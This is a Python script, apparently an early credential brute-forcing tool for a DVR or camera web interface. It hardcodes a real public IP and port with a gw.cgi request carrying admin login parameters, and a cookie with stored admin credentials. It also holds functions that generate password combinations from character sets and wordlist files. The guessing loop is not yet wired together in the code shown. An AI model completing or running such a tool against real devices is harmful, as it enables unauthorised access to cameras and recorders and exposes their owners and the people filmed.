import requests
import os
import argparse
import json
import platform
import time
import csv
import re
from tqdm import tqdm
import urllib3

head_wind10_chrom = {
"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
"Accept-Encoding":"gzip, deflate",
"Accept-Language":"zh-CN,zh;q=0.9",
"Cache-Control":"max-age=0",
"Connection":"keep-alive",
"Cookie":"dvr_camcnt=8; dvr_clientport=80; dvr_sensorcnt=4; lxc_save=admin%2C22222222",
"If-Modified-Since": "Tue, 23 Feb 2016 01:06:34 GMT",
"Upgrade-Insecure-Requests": "1",
"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36"
}
keydigit = ['0','1','2','3','4','5','6','7','8','9']
keybigle = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']
keysmale = ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z']
keyspeci = [' ','#','@','!','$','%','^','&','*','(',')','-','_','+','=','[',']','{','}','|','\\',';',':','\'','\"',',','<','.','>','/','?','`','~']

url = "http://61.180.173.188:60001/cgi-bin/gw.cgi?xml=%3Cjuan%20ver=%22%22%20squ=%22%22%20dir=%220%22%3E%3Crpermission%20usr=%22admin%22%20pwd=%22456%22%3E%3Cconfig%20base=%22%22/%3E%3Cplayback%20base=%22%22/%3E%3C/rpermission%3E%3C/juan%3E&_=1593571438026"
def url_parameter(url):
    para = {}
    for ur in url.split("&"):
        if ur == "":
            continue
        ur = ur.split("=",1)
        if len(ur) == 2:
            para[ur[0]] = ur [1]
    return para

def url_hostporturl(url):
    if url == None or url == "":
        return None
    urlpa = {"http":"","ip":"","post":"","url":"","parameter":{}}
    url = url.strip()
    urltype = url.split("?",1)
    if len(urltype) == 2:
        url = urltype[0]
        urlpa["parameter"] = url_parameter(urltype[1])
    urltype = url.split("://",1)
    if len(urltype) == 2:
        urlpa["http"] = urltype[0]
        url = urltype[1]
    urltype = url.split("/",1)
    if len(urltype) == 2:
        urlpa["url"] = urltype[1]
        url = urltype[0]
    urltype = url.split(":",1)
    if len(urltype) == 2:
        urlpa["ip"] = urltype[0]
        urlpa["post"] = urltype[1]
    else :
        urlpa["ip"] = url
    return urlpa


def url_text(url,headers = head_wind10_chrom):
    urlpa = url_hostporturl(url)
    print(urlpa)
    if urlpa["post"] != "":
        headers["Host"] = urlpa["ip"] + ":" + urlpa["post"]
    else :
        headers["Host"] = urlpa["ip"]
    print(headers)
    res = requests.get(url = url,verify=False,headers=headers,stream=True)
    print(res.text)
    print(res.status_code)

#递归取文件进行组合
def dictionary_dg(txt,type):
    if type <= 0:
        for text in txt:
            if text != "":
                yield text
    else :
        for text in txt:
            if text != "":
                for txtl in dictionary_dg(txt,type - 1):
                    if txtl != "":
                        yield text+txtl
#取参数文件
#url 为路径
#type = 0 获取当前文件内数量
#type = n (n>0) 获取当前文件内有序组合
def dictionary_read(url,type = 1):
    rea = open(url,'r',encoding='utf-8')
    if type <= 0:
        i = 0
        for text in rea:
            if text != "":
                i += 1
        yield i
    elif type == 1:
        for text in rea:
            if text != "":
                yield text.strip("\n")
    else :
        txt = rea.read().split('\n')
        for text in dictionary_dg(txt,type - 1):
            if text != "":
                yield text.strip("\n")
    rea.close

def dictionary_write(url,str,type = 1):
    text = []
    for passer in dictionary_read(url,1):
        if passer != "":
            text.append(passer)
        
    rea = open(url,'a',encoding='utf-8')
    if type == 1:
        for passer in str:
            if passer != "" and passer not in text:
                rea.write("\n"+passer.strip("\n"))
    else :
        for passer in dictionary_dg(str,type - 1):
            if passer != "" and passer not in text:
                rea.write("\n"+passer.strip("\n"))
    rea.close

if __name__ == "__main__":
    # url_text(url)
    # for passer in dictionary_read("key.xqc",5):
        # print(passer)
    dictionary_write("key.xqc",["0","15","16"],1)